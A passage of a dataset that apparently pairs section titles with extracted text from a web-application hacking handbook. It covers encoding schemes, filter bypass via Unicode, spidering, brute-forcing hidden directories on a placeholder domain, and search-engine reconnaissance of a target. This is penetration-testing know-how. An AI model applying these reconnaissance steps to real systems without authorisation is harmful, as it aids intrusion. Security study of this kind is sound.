SESS=GTnrpx2ss2tSWSnhXJGyG0LJ47MXRsjcFM6Bd\n------------7d71385d0a1a\nContent-Disposition: form-data; name=”username”\ndaf\n------------7d71385d0a1a\nContent-Disposition: form-data; name=”password”\nfoo\n------------7d71385d0a1a\nContent-Disposition: form-data; name=”redir”\n/secure/home.php\n------------7d71385d0a1a\nContent-Disposition: form-data; name=”submit”\nlog in\n------------7d71385d0a1a--\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 54\n54 Chapter 3 ■ Web Application Technologies\nJavaScript\nHyperlinks and forms can be used to create a rich user interface capable of eas-\nily gathering most kinds of input which web applications require. However,\nmost applications employ a more distributed model, in which the client side is\nused not simply to submit user data and actions but also to perform actual pro-\ncessing of data. This is done for two primary reasons:\n■■ It can improve the application’s performance, because certain tasks can\nbe carried out entirely on the client component, without needing to\nmake a round trip of request and response to the server.\n■■ It can enhance usability, because parts of the user interface can be\ndynamically updated in response to user actions, without needing to\nload an entirely new HTML page delivered by the server.\nJavaScript is a relatively simple but powerful programming language that\ncan be easily used to extend web interfaces in ways that are not possible using\nHTML alone. It is commonly used to perform the following tasks:\n■■ Validating user-entered data before this is submitted to the server, to\navoid unnecessary requests if the data contains errors.\n■■ Dynamically modifying the user interface in response to user actions;\nfor example, to implement drop-down menus and other controls famil-\niar from non-web interfaces.\n■■ Querying and updating the document object model (DOM) within the\nbrowser to control the browser’s behavior.\nA significant development in the use of JavaScript has been the appearance\nof AJAX techniques for creating a smoother user experience which is closer to\nthat provided by traditional desktop applications. AJAX (or Asynchronous\nJavaScript and XML) involves issuing dynamic HTTP requests from within an\nHTML page, to exchange data with the server and update the current web\npage accordingly, without loading a new page altogether. These techniques\ncan provide very rich and satisfying user interfaces. They can also sometimes\nbe used by attackers to powerful effect, and may introduce vulnerabilities of\ntheir own if not carefully implemented (see Chapter 12).\nThick Client Components\nGoing beyond the capabilities of JavaScript, some web applications employ\nthicker client technologies that use custom binary code to extend the browser’s\nbuilt-in capabilities in arbitrary ways. These components may be deployed as\nbytecode that is executed by a suitable browser plug-in, or may involve\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 55\nChapter 3 ■ Web Application Technologies 55\ninstalling native executables onto the client computer itself. The thick-client\ntechnologies you are likely to encounter when attacking web applications are:\n■■ Java applets\n■■ ActiveX controls\n■■ Shockwave Flash objects\nThese technologies are described in detail in Chapter 5.\nState and Sessions\nThe technologies described so far enable the server and client components of a\nweb application to exchange and process data in numerous ways. To imple-\nment most kinds of useful functionality, however, applications need to track\nthe state of each user’s interaction with the application across multiple\nrequests. For example, a shopping application may allow users to browse a\nproduct catalogue, add items to a cart, view and update the cart contents, pro-\nceed to checkout, and provide personal and payment details.\nTo make this kind of functionality possible, the application must maintain a\nset of stateful data generated by the user’s actions across several requests. This\ndata is normally held within a server-side structure called a session. When a\nuser performs an action, such as adding an item to her shopping cart, the\nserver-side application updates the relevant details within the user’s session.\nWhen the user later views the contents of her cart, data from the session is\nused to return the correct information to the user.\nIn some applications, state information is stored on the client component\nrather than the server. The current set of data is passed to the client in each\nserver response, and is sent back to the server in each client request. Of course,\nbecause any data transmitted via the client component may be modified by the\nuser, applications need to take measures to protect themselves from attackers\nwho may change this state information in an attempt to interfere with the\napplication’s logic. The ASP.NET platform makes use of a hidden form field\ncalled the ViewState to store state information about the user’s web interface\nand so reduce overhead on the server. By default, the contents of the ViewState\ninclude a keyed hash to prevent tampering.\nBecause the HTTP protocol is itself stateless, most applications need a\nmeans of re-identifying individual users across multiple requests, in order for\nthe correct set of state data to be used to process each request. This is normally\nachieved by issuing each user a token which uniquely identifies that user’s\nsession. These tokens may be transmitted using any type of request parameter,\nbut HTTP cookies are used by most applications. Several kinds of vulnerabil-\nity arise in relation to session handling, and these are described in detail in\nChapter 7."
  },
  {
    "input": "Encoding Schemes",
    "output": "70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 56\n56 Chapter 3 ■ Web Application Technologies\nEncoding Schemes\nWeb applications employ several different encoding schemes for their data.\nBoth the HTTP protocol and the HTML language are historically text-based,\nand different encoding schemes have been devised to ensure that unusual\ncharacters and binary data can be safely handled by these mechanisms. When\nyou are attacking a web application, you will frequently need to encode data\nusing a relevant scheme to ensure that it is handled in the way you intend. Fur-\nther, in many cases you may be able to manipulate the encoding schemes used\nby an application to cause behavior that its designers did not intend.\nURL Encoding\nURLs are permitted to contain only the printable characters in the US-ASCII\ncharacter set—that is, those whose ASCII code is in the range 0x20–0x7e\ninclusive. Further, several characters within this range are restricted because\nthey have special meaning within the URL scheme itself or within the HTTP\nprotocol.\nThe URL encoding scheme is used to encode any problematic characters\nwithin the extended ASCII character set so that they can be safely transported\nover HTTP. The URL-encoded form of any character is the %prefix followed by\nthe character’s two-digit ASCII code expressed in hexadecimal. Some exam-\nples of characters that are commonly URL-encoded are shown here:\n%3d =\n%25 %\n%20 space\n%0a new line\n%00 null byte\nA further encoding to be aware of is the +character, which represents a URL-\nencoded space (in addition to the %20representation of a space).\nNOTE For the purpose of attacking web applications, you should URL-encode\nany of the following characters when you are inserting them as datainto an\nHTTP request:\nspace % ? & = ; + #\n(Of course, you will often need to use these characters with their special\nmeaning when modifying a request—for example, to add an additional request\nparameter to the query string. In this case, they should be used in their literal\nform.)\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 57\nChapter 3 ■ Web Application Technologies 57\nUnicode Encoding\nUnicode is a character encoding standard that is designed to support all of the\nwriting systems used in the world. It employs various encoding schemes, some\nof which can be used to represent unusual characters in web applications.\n16-bit Unicode encoding works in a similar way to URL-encoding. For\ntransmission over HTTP, the 16-bit Unicode-encoded form of a character is the\n%u prefix followed by the character’s Unicode code point expressed in hexa-\ndecimal. For example:\n%u2215 /\n%u00e9 é\nUTF-8 is a variable-length encoding standard that employs one or more\nbytes to express each character. For transmission over HTTP, the UTF-8\nencoded form of a multi-byte character simply uses each byte expressed in\nhexadecimal and preceded by the %prefix. For example:\n%c2%a9 ©\n%e2%89%a0 ≠\nFor the purpose of attacking web applications, Unicode encoding is primar-\nily of interest because it can sometimes be used to defeat input validation\nmechanisms. If an input filter blocks certain malicious expressions, but the\ncomponent that subsequently processes the input understands Unicode\nencoding, then it may be possible to bypass the filter using various standard\nand malformed Unicode encodings.\nHTML Encoding\nHTML encoding is a scheme used to represent problematic characters so that\nthey can be safely incorporated into an HTML document. Various characters\nhave special meaning as meta-characters within HTML and are used to define\nthe structure of a document rather than its content. To use these characters\nsafely as part of the document’s content, it is necessary to HTML-encode them.\nHTML encoding defines numerous HTML entities to represent specific lit-\neral characters, for example:\n&quot; “\n&apos; ‘\n&amp; &\n&lt; <\n&gt; >\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 58\n58 Chapter 3 ■ Web Application Technologies\nIn addition, any character can be HTML-encoded using its ASCII code in\ndecimal form, for example:\n&#34; “\n&#39; ‘\nor by using its ASCII code in hexadecimal form (prefixed by an x), for example:\n&#x22; “\n&#x27; ‘\nWhen you are attacking a web application, your main interest in HTML\nencoding is likely to be when probing for cross-site scripting vulnerabilities. If\nan application returns user input unmodified within its responses, then it is\nprobably vulnerable, whereas if dangerous characters are HTML-encoded\nthen it is probably safe. See Chapter 12 for more details of these vulnerabilities.\nBase64 Encoding\nBase64 encoding allows any binary data to be safely represented using only\nprintable ASCII characters. It is commonly used for encoding email attach-\nments for safe transmission over SMTP, and is also used to encode user cre-\ndentials in basic HTTP authentication.\nBase64 encoding processes input data in blocks of three bytes. Each of these\nblocks is divided into four chunks of six bits each. Six bits of data allow for 64\ndifferent possible permutations, and so each chunk can be represented using a\nset of 64 characters. Base64 encoding employs the following character set,\nwhich contains only printable ASCII characters:\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\nIf the final block of input data results in less than three chunks of output\ndata, then the output is padded with one or two =characters.\nFor example, the Base64-encoded form of The Web Application Hacker’s Hand-\nbookis:\nVGhlIFdlYiBBcHBsaWNhdGlvbiBIYWNrZXIncyBIYW5kYm9vaw==\nMany web applications make use of Base64 encoding for transmitting\nbinary data within cookies and other parameters, and even for obfuscating\nsensitive data to prevent trivial modification. You should always look out for,\nand decode, any Base64 data that is issued to the client. Base64-encoded\nstrings can often be easily recognized from their specific character set and the\npresence of padding characters at the end of the string."
  },
  {
    "input": "Questions",
    "output": "70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 59\nChapter 3 ■ Web Application Technologies 59\nHex Encoding\nMany applications use straightforward hexadecimal encoding when transmit-\nting binary data, using ASCII characters to represent the hexadecimal block.\nFor example, hex-encoding the username “daf” within a cookie would result in:\n646166\nAs with Base64, hex-encoded data is usually easy to spot, and you should\nalways attempt to decode any such data that the server sends to the client, to\nunderstand its function.\nNext Steps\nSo far, we have described the current state of web application (in)security,\nexamined the core mechanisms by which web applications can defend them-\nselves, and taken a brief look at the key technologies employed in today’s\napplications. With this groundwork in place, we are now in a position to start\nlooking at the actual practicalities of attacking web applications.\nIn any attack, your first task is to map the target application’s content and\nfunctionality, to establish how it functions, how it attempts to defend itself,\nand what technologies it uses. The next chapter examines this mapping\nprocess in detail and shows how you can use it to obtain a deep understand-\ning of an application’s attack surface that will prove vital when it comes to\nfinding and exploiting security flaws within your target.\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. What is the OPTIONSmethod used for?\n2. What are the If-Modified-Sinceand If-None-Matchheaders used for?\nWhy might you be interested in these when attacking an application?\n3. What is the significance of the secureflag when a server sets a cookie?\n4. What is the difference between the common status codes 301 and 302?\n5. How does a browser interoperate with a web proxy when SSL is being\nused?\n70779c03.qxd:WileyRed 9/14/07 3:12 PM Page 60"
  },
  {
    "input": "Chapter 4: Mapping the Application",
    "output": "70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 61\nCHAPTER\n4\nMapping the Application\nThe first step in the process of attacking an application is to gather and exam-\nine some key information about it, in order to gain a better understanding of\nwhat you are up against.\nThe mapping exercise begins by enumerating the application’s content and\nfunctionality, in order to understand what the application actually does and\nhow it behaves. Much of this functionality will be easy to identify, but some of\nit may be hidden away, and require a degree of guesswork and luck in order to\ndiscover.\nHaving assembled a catalogue of the application’s functionality, the princi-\npal task is to closely examine every aspect of its behavior, its core security\nmechanisms, and the technologies being employed (on both client and server).\nThis will enable you to identify the key attack surface that the application\nexposes and hence the most interesting areas on which to target subsequent\nprobing to find exploitable vulnerabilities.\nIn this chapter, we will describe the practical steps you need to follow dur-\ning application mapping, various techniques and tricks you can use to maxi-\nmize its effectiveness, and some tools that can assist you in the process.\n61"
  },
  {
    "input": "Enumerating Content and Functionality",
    "output": "70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 62\n62 Chapter 4 ■ Mapping the Application\nEnumerating Content and Functionality\nIn a typical application, the majority of the content and functionality can be\nidentified via manual browsing. The basic approach is to walk through the\napplication starting from the main initial page, following every link and navi-\ngating through all multistage functions (such as user registration or password\nresetting). If the application contains a “site map,” this can provide a useful\nstarting point for enumerating content.\nHowever, to perform a rigorous inspection of the enumerated content, and\nto obtain a comprehensive record of everything identified, it is necessary to\nemploy some more advanced techniques than simple browsing.\nWeb Spidering\nVarious tools exist which perform automated spidering of web sites. These\ntools work by requesting a web page, parsing it for links to other content,\nand then requesting these, continuing recursively until no new content is\ndiscovered.\nBuilding on this basic function, web application spiders attempt to achieve\na higher level of coverage by also parsing HTML forms and submitting these\nback to the application using various preset or random values. This can enable\nthem to walk through multistage functionality, and to follow forms-based nav-\nigation (e.g., where drop-down lists are used as content menus). Some tools\nalso perform some parsing of client-side JavaScript to extract URLs pointing to\nfurther content. The following free tools all do a decent job of enumerating\napplication content and functionality (see Chapter 19 for a detailed analysis of\ntheir capabilities):\n■■ Paros\n■■ Burp Spider (part of Burp Suite)\n■■ WebScarab\nFigure4-1 shows the results of using Burp Spider to map part of an application.\nTIP Many web servers contain a file named robots.txtin the web root,\nwhich contains a list of URLs that the site does not wish web spiders to visit or\nsearch engines to index. Sometimes, this file contains references to sensitive\nfunctionality, which you are certainly interested in spidering. Some spidering\ntools designed for attacking web applications will check for the robots.txt\nfile and use all URLs within it as seeds in the spidering process.\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 63\nChapter 4 ■ Mapping the Application 63\nFigure4-1: Mapping part of an application using Burp Spider\nWhile it can often be effective, there are some important limitations of this\nkind of fully automated approach to content enumeration:\n■■ Unusual navigation mechanisms (such as menus dynamically created\nand handled using complicated JavaScript code) are often not handled\nproperly by these tools, and so they may miss whole areas of an appli-\ncation.\n■■ Multistage functionality often implements fine-grained input validation\nchecks, which do not accept the values that may be submitted by an auto-\nmated tool. For example, a user registration form may contain fields for\nname, email address, telephone number, and ZIP code. An automated\napplication spider will typically submit a single test string in each\neditable form field, and the application will return an error message say-\ning that one or more of the items submitted were invalid. Because the spi-\nder is not intelligent enough to understand and act upon this message, it\nwill not proceed past the registration form and so will not discover any\nfurther content or functions accessible beyond it.\n■■ Automated spiders typically use URLs as identifiers of unique content.\nTo avoid continuing spidering indefinitely, they recognize when linked\ncontent has already been requested and do not request it again. How-\never, many applications use forms-based navigation in which the same\nURL may return very different content and functions. For example, a\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 64\n64 Chapter 4 ■ Mapping the Application\nbanking application may implement every user action via a POST\nrequest to /account.jsp, and use parameters to communicate the\naction being performed. If a spider refuses to make multiple requests to\nthis URL, it will miss most of the application’s content. Some applica-\ntion spiders attempt to handle this situation (for example, Burp Spider\ncan be configured to individuate form submissions based on parameter\nnames and values); however, there may still be situations where a fully\nautomated approach is not completely effective.\n■■ Conversely to the previous point, some applications place volatile data\nwithin URLs that is not actually used to identify resources or functions\n(for example, parameters containing timers or random number seeds).\nEach page of the application may contain what appears to be a new set\nof URLs that the spider must request, causing it to continue running\nindefinitely.\n■■ Where an application uses authentication, an effective application spi-\nder must be able to handle this in order to access the functionality that\nit protects. The spiders mentioned previously can achieve this, by man-\nually configuring them either with a token for an authenticated session\nor with credentials to submit to the login function. However, even\nwhen this is done, it is common to find that the operation of the spider\nbreaks the authenticated session for various reasons:\n■■ By following all URLs, the spider will at some point request the\nlogout function, causing its session to break.\n■■ If the spider submits invalid input to a sensitive function, the appli-\ncation may defensively terminate the session.\n■■ If the application uses per-page tokens, the spider will almost cer-\ntainly fail to handle these properly by requesting pages out of their\nexpected sequence, probably causing the entire session to be termi-\nnated.\nWARNING In some applications, running even a simple web spider that\nparses and requests links can be extremely dangerous. For example, an\napplication may contain administrative functionality that deletes users, shuts\ndown a database, restarts the server, and the like. If an application-aware\nspider is used, great damage can be done if the spider discovers and uses\nsensitive functionality. The authors have encountered an application that\nincluded functionality to edit the actual content of the main application. This\nfunctionality was discoverable via the site map and was not protected by any\naccess control. If an automated spider were run against this site, it would find\nthe edit function and begin sending arbitrary data, resulting in the main web\nsite being defaced in real time while the spider was running.\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 65\nChapter 4 ■ Mapping the Application 65\nUser-Directed Spidering\nThis is a more sophisticated and controlled technique, which is usually prefer-\nable to automated spidering. Here, the user walks through the application in\nthe normal way using a standard browser, attempting to navigate through all\nof the application’s functionality. As he does so, the resulting traffic is passed\nthrough a tool combining an intercepting proxy and spider, which monitors all\nrequests and responses. The tool builds up a map of the application, incorpo-\nrating all of the URLs visited by the browser, and also parses all of the applica-\ntion’s responses in the same way as a normal application-aware spider and\nupdates the site map with the content and functionality it discovers. The spi-\nders within Burp Suite and WebScarab can be used in this way (see Chapter 19\nfor further information).\nCompared with the basic spidering approach, this technique carries numer-\nous benefits:\n■■ Where the application uses unusual or complex mechanisms for navi-\ngation, the user can follow these using a browser in the normal way.\nAny functions and content accessed by the user will be processed by\nthe proxy/spider tool.\n■■ The user controls all data submitted to the application and can ensure\nthat data validation requirements are met.\n■■ The user can log in to the application in the usual way, and ensure that\nthe authenticated session remains active throughout the mapping\nprocess. If any action performed results in session termination, the user\ncan log in again and continue browsing.\n■■ Any dangerous functionality, such as deleteUser.jsp, will be fully\nenumerated and incorporated into the site map, because links to it will\nbe parsed out of the application’s responses. But the user can use his\ndiscretion in deciding which functions to actually request or carry out.\nTIP In addition to the proxy/spider tools just described, another range of\ntools that are often useful during application mapping are the various browser\nextensions that can perform HTTP and HTML analysis from within the browser\ninterface. For example, the IEWatch tool illustrated in Figure4-2, which runs\nwithin Microsoft Internet Explorer, monitors all details of requests and\nresponses, including headers, request parameters, and cookies, and analyzes\nevery application page to display links, scripts, forms, and thick-client\ncomponents. While all of this information can, of course, be viewed in\nyour intercepting proxy, having a second record of useful mapping data can\nonly help you better understand the application and enumerate all of its\nfunctionality. See Chapter 19 for more information about tools of this kind.\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 66\n66 Chapter 4 ■ Mapping the Application\nFigure4-2:IEWatch performing HTTP and HTML analysis from within the browser\nHACK STEPS\n■ Configure your browser to use either Burp or WebScarab as a local proxy\n(see Chapter 19 for specific details about how to do this if you are unsure).\n■ Browse the entire application normally, attempting to visit every single\nlink/URL you discover, submitting every single form, and proceeding\nthrough all multistep functions to completion. Try browsing with\nJavaScript enabled and disabled, and with cookies enabled and disabled.\nMany applications can handle various browser configurations, and you\nmay reach different content and code paths within the application.\n■ Review the site map generated by the proxy/spider tool, and identify any\napplication content or functions that you did not browse manually.\nEstablish how the spider enumerated each item—for example, in Burp\nSpider, check the Linked From details. Using your browser, access the\nitem manually, so that the response from the server is parsed by the\nproxy/spider tool to identify any further content. Continue this step\nrecursively until no further content or functionality is identified.\n■ Optionally, tell the tool to actively spider the site using all of the already\nenumerated content as a starting point. To do this, first identify any URLs\nthat are dangerous or likely to break the application session, and config-\nure the spider to exclude these from its scope. Run the spider and review\nthe results for any additional content that it discovers.\n■ The site map generated by the proxy/spider tool contains a wealth of\ninformation about the target application, which will be useful later in\nidentifying the various attack surfaces exposed by the application.\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 67\nChapter 4 ■ Mapping the Application 67\nDiscovering Hidden Content\nIt is very common for applications to contain content and functionality which\nis not directly linked or reachable from the main visible content. A common\nexample of this is functionality that has been implemented for testing or\ndebugging purposes and has never been removed.\nAnother example arises where the application presents different functional-\nity to different categories of users (for example, anonymous users, authenti-\ncated regular users, and administrators). Users at one privilege level who\nperform exhaustive spidering of the application may miss functionality that is\nvisible to users at other levels. An attacker who discovers the functionality\nmay be able to exploit it to elevate her privileges within the application.\nThere are countless other cases in which interesting content and functional-\nity may exist that the mapping techniques previously described would not\nidentify, including:\n■■ Backup copies of live files. In the case of dynamic pages, their file exten-\nsion may have changed to one that is not mapped as executable,\nenabling you to review the page source for vulnerabilities that can then\nbe exploited on the main page.\n■■ Backup archives that contain a full snapshot of files within (or indeed\noutside) the web root, possibly enabling you to easily identify all con-\ntent and functionality within the application.\n■■ New functionality that has been deployed to the server for testing but\nnot yet linked from the main application.\n■■ Old versions of files that have not been removed from the server. In the\ncase of dynamic pages, these may contain vulnerabilities that have been\nfixed in the current version but can still be exploited in the old version.\n■■ Configuration and include files containing sensitive data such as data-\nbase credentials.\n■■ Source files out of which the live application’s functionality has been\ncompiled.\n■■ Log files that may contain sensitive information such as valid user-\nnames, session tokens, URLs visited, actions performed, and so on.\nEffective discovery of hidden content requires a combination of automated\nand manual techniques, and often relies upon a degree of luck.\nBrute-Force Techniques\nIn Chapter 13, we will describe how automated techniques can be leveraged to\nspeed up just about any attack against an application. In the present context,\nautomation can be used to make huge numbers of requests to the web server,\nattempting to guess the names or identifiers of hidden functionality.\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 68\n68 Chapter 4 ■ Mapping the Application\nFor example, suppose that your user-directed spidering has identified the\nfollowing application content:\nhttps://wahh-app.com/login.php\nhttps://wahh-app.com/home/myaccount.php\nhttps://wahh-app.com/home/logout.php\nhttps://wahh-app.com/help/\nhttps://wahh-app.com/register.php\nhttps://wahh-app.com/menu.js\nhttps://wahh-app.com/scripts/validate.js\nThe first step in an automated effort to identify hidden content might\ninvolve the following requests, to locate additional directories:\nhttps://wahh-app.com/access/\nhttps://wahh-app.com/account/\nhttps://wahh-app.com/accounts/\nhttps://wahh-app.com/accounting/\nhttps://wahh-app.com/admin/\nhttps://wahh-app.com/agent/\nhttps://wahh-app.com/agents/\n...\nNext, the following requests could be made, to locate additional pages:\nhttps://wahh-app.com/access.php\nhttps://wahh-app.com/account.php\nhttps://wahh-app.com/accounts.php\nhttps://wahh-app.com/accounting.php\nhttps://wahh-app.com/admin.php\nhttps://wahh-app.com/agent.php\nhttps://wahh-app.com/agents.php\n...\nhttps://wahh-app.com/home/access.php\nhttps://wahh-app.com/home/account.php\nhttps://wahh-app.com/home/accounts.php\nhttps://wahh-app.com/home/accounting.php\nhttps://wahh-app.com/home/admin.php\nhttps://wahh-app.com/home/agent.php\nhttps://wahh-app.com/home/agents.php\n...\nNOTE Do not assume that the application will respond with “200 OK” if a\nrequested resource exists, and “404 Not Found” if it does not. Many\napplications handle requests for nonexistent resources in a customized way,\noften returning a bespoke error message and a 200 response code. Further,\nsome requests for existent resources may receive a non-200 response. The\nfollowing is a rough guide to the likely meaning of the response codes that you\nmay encounter during a brute-forcing exercise looking for hidden content:\n■■ 302 Found—If the redirect is to a login page, the resource may be\naccessible only by authenticated users. If it is to an error message, this\nmay disclose a different reason. If it is to another location, the redirect\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 69\nChapter 4 ■ Mapping the Application 69\nmay be part of the application’s intended logic, and this should be\ninvestigated further.\n■■ 400 Bad Request – The application may use a custom naming scheme\nfor directories and files within URLs, which a particular request has not\ncomplied with. More likely, however, is that the wordlist you are using\ncontains some whitespace characters or other invalid syntax.\n■■ 401 Unauthorized or 403 Forbidden – This usually indicates that the\nrequested resource exists but may not be accessed by any user,\nregardless of authentication status or privilege level. It often occurs when\ndirectories are requested, and you may infer that the directory exists.\n■■ 500 Internal Server Error – During content discovery, this usually\nindicates that the application expects certain parameters to be\nsubmitted when requesting the resource.\nThe various possible responses that may indicate the presence of interesting\ncontent mean that is difficult to write a fully automated script to output a list-\ning of valid resources. The best approach is to capture as much information as\npossible about the application’s responses during the brute-force exercise, and\nmanually review it.\nBurp Intruder can be used to iterate through a list of common directory\nnames and capture details of the server’s responses, which can be reviewed to\nidentify valid directories. Figure4-3 shows Burp Intruder being configured to\nprobe for common directories residing at the web root.\nFigure4-3: Burp Intruder being configured to probe for common directories\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 70\n70 Chapter 4 ■ Mapping the Application\nWhen the attack has been executed, clicking on column headers such as\n“status” and “length” will sort the results accordingly, enabling anomalies to\nbe quickly picked out, as shown in Figure4-4.\nFigure4-4: The results of a test probing for common directories\nHACK STEPS\n■ Make some manual requests for known valid and invalid resources, and\nidentify how the server handles the latter.\n■ Use the site map generated through user-directed spidering as a basis for\nautomated discovery of hidden content.\n■ Make automated requests for common filenames and directories within\neach directory or path known to exist within the application. Use Burp\nIntruder or a custom script, together with wordlists of common files and\ndirectories, to quickly generate large numbers of requests. If you have\nidentified a particular way in which the application handles requests for\ninvalid resources (e.g., a customized “file not found” page), configure\nIntruder or your script to highlight these results so they can be ignored.\n■ Capture the responses received from the server, and manually review\nthese to identify valid resources.\n■ Perform the exercise recursively as new content is discovered.\nInference from Published Content\nMost applications employ some kind of naming scheme for their content and\nfunctionality. By inferring from the resources already identified within the\napplication, it is possible to fine-tune your automated enumeration exercise to\nincrease the likelihood of discovering further hidden content.\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 71\nChapter 4 ■ Mapping the Application 71\nHACK STEPS\n■ Review the results of your user-directed browsing and basic brute-force\nexercises. Compile lists of the names of all enumerated subdirectories,\nfile stems, and file extensions.\n■ Review these lists to identify any naming schemes in use. For example,\nif there are pages called AddDocument.jspand ViewDocument.jsp,\nthen there may also be pages called EditDocument.jspand\nRemoveDocument.jsp. You can often get a feel for the naming habits of\ndevelopers just by reading a few examples. For example, depending on\ntheir personal style, developers may be verbose (AddANewUser.asp),\nsuccinct (AddUser.asp), use abbreviations (AddUsr.asp), or even be\nmore cryptic (AddU.asp). Getting a feel for the naming styles in use may\nhelp you guess the precise names of content that you have not already\nidentified.\n■ Sometimes, the naming scheme used for different content employs\nidentifiers such as numbers and dates, which can make inferring hidden\ncontent extremely easy. This is most commonly encountered in the\nnames of static resources, rather than dynamic scripts. For example,\nif a company’s web site links to AnnualReport2004.pdfand Annual\nReport2005.pdf, it ought to be a short step to identifying what the next\nreport will be called. Somewhat incredibly, there have been notorious\ncases of companies placing files containing financial results onto their\nweb servers before these were publicly announced, only to have wily\njournalists discover them based on the naming scheme used in earlier\nyears.\n■ Review all client-side code such as HTML and JavaScript to identify any\nclues about hidden server-side content. These may include HTML com-\nments relating to protected or unlinked functions, and HTML forms with\ndisabled SUBMITelements, and the like. Often, comments are automati-\ncally generated by the software that has been used to generate web con-\ntent, or by the platform on which the application is running. References\nto items such as server-side include files are of particular interest—\nthese files may actually be publicly downloadable and may contain\nhighly sensitive information such as database connection strings and\npasswords. In other cases, developers’ comments may contain all kinds\nof useful tidbits, such as database names, references to back-end com-\nponents, SQL query strings, and so on. Thick-client components such as\nJava applets and ActiveX controls may also contain sensitive data that\nyou can extract. See Chapter 14 for further ways in which the application\nmay disclose information about itself.\n(continued)\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 72\n72 Chapter 4 ■ Mapping the Application\nHACK STEPS (continued)\n■ Add to the lists of enumerated items any further potential names conjec-\ntured on the basis of these. Also add to the file extension list common\nextensions such as txt, bak, src, inc, and old, which may uncover the\nsource to backup versions of live pages, as well as extensions associated\nwith the development languages in use, such as Java and cs, which may\nuncover source files that have been compiled into live pages (see the tips\ndescribed later in this chapter for identifying technologies in use). The\nParos tool carries out this test when used to perform a vulnerability scan\n(see Chapter 19).\n■ Search for temporary files which may have been created inadvertently by\ndeveloper tools and file editors—for example, the .DS_Storefile, which\ncontains a directory index under OSX, or file.php~1, which is a tempo-\nrary file created when file.phpis edited.\n■ Perform further automated exercises, combining the lists of directories,\nfile stems, and file extensions to request large numbers of potential\nresources. For example, in a given directory, request each file stem com-\nbined with each file extension. Or request each directory name as a sub-\ndirectory of every known directory.\n■ Where a consistent naming scheme has been identified, consider per-\nforming a more focused brute-force exercise on the basis of this. For\nexample, if AddDocument.jspand ViewDocument.jspare known to\nexist, you may create a list of actions (edit, delete, create, etc.) and make\nrequests of the form XxxDocument.jsp. Alternatively, create a list of\ntypes of item (user, account, file, etc.) and make requests of the form\nAddXxx.jsp.\n■ Perform each exercise recursively, using new enumerated content and\npatterns as the basis for further user-directed spidering, and further\nautomated content discovery. You are limited only by your imagination,\ntime available, and the importance you attach to discovering hidden con-\ntent within the application you are targeting.\nUse of Public Information\nThere may be content and functionality within the application that is not\npresently linked from its main content, but has been linked in the past. In this\nsituation, it is likely that various historical repositories will still contain refer-\nences to the hidden content. There are two main types of publicly available\nresources that are useful here:\n■■ Search enginessuch as Google, Yahoo and MSN. These maintain a\nfine-grained index of all content which their powerful spiders have\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 73\nChapter 4 ■ Mapping the Application 73\ndiscovered, and also cached copies of much of this content, which per-\nsists even after the original content has been removed.\n■■ Web archivessuch as the WayBack Machine located at\nweb.archive.org. These archives maintain a historical record of a very\nlarge number of web sites, and in many cases allow users to browse a\nfully replicated snapshot of a given site as it existed at various dates\ngoing back several years.\nIn addition to content that has been linked in the past, these resources are\nalso likely to contain references to content that is linked from third-party sites,\nbut not from within the target application itself. For example, some applica-\ntions contain restricted functionality for use by their business partners. Those\npartners may disclose the existence of the functionality in ways that the appli-\ncation itself does not.\nHACK STEPS\n■ Use several different search engines and web archives (listed previously)\nto discover what content they indexed or stored for the application you\nare attacking.\n■ When querying a search engine, you can use various advanced tech-\nniques to maximize the effectiveness of your research. The following sug-\ngestions apply to Google—you can find the corresponding queries on\nother engines by selecting their Advanced Search option:\n■ site:www.wahh-target.com—This will return every resource within\nthe target site which Google has a reference to.\n■ site:www.wahh-target.com login—This will return all of the\npages containing the expression login. In a very large and complex\napplication, this technique can be used to quickly home in on interest-\ning resources, such as site maps, password reset functions, adminis-\ntrative menus, and the like.\n■ link:www.wahh-target.com—This will return all of the pages on\nother web sites and applications that contain a link to the target. This\nmay include links to old content, or functionality that is intended for\nuse only by third parties, such as partner links.\n■ related:www.wahh-target.com—This returns pages that are “simi-\nlar” to the target, and so will include a lot of irrelevant material. How-\never, it may also include discussion about the target on other sites,\nwhich may be of interest.\n■ For each search, perform it not only in the default Web section of\nGoogle, but also Groups and News, which may contain different\nresults.\n(continued)\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 74\n74 Chapter 4 ■ Mapping the Application\nHACK STEPS (continued)\n■ Browse to the last page of search results for a given query, and select\nRepeat the Search with the Omitted Results Included. By default,\nGoogle attempts to filter out redundant results by removing pages that\nit believes are sufficiently similar to others included in the results.\nOverriding this behavior may uncover subtly different pages that are\nof interest to you when attacking the application.\n■ View the cached version of interesting pages, including any content\nthat is no longer present in the actual application. In some cases,\nsearch engine caches contain resources that cannot be directly\naccessed in the application without authentication or payment.\n■ Perform the same queries on other domain names belonging to the\nsame organization, which may contain useful information about the\napplication you are targeting.\n■ If your research identifies old content and functionality that is no longer\nlinked to within the main application, it may still be present and usable.\nThe old functionality may contain vulnerabilities that do not exist else-\nwhere within the application.\n■ Even where old content has been removed from the live application,\ndetails about the content obtained from a search engine cache or web\narchive may contain references to or clues about other functionality that is\nstill present within the live application, and that can be used to attack it.\nA further public source of useful information about the target application is\nany posts that developers and others have made to Internet forums. There are\nnumerous such forums in which software designers and programmers ask\nand answer technical questions. Often, items posted to these forums will con-\ntain information about an application that is of direct benefit to an attacker,\nincluding the technologies in use, the functionality implemented, problems\nencountered 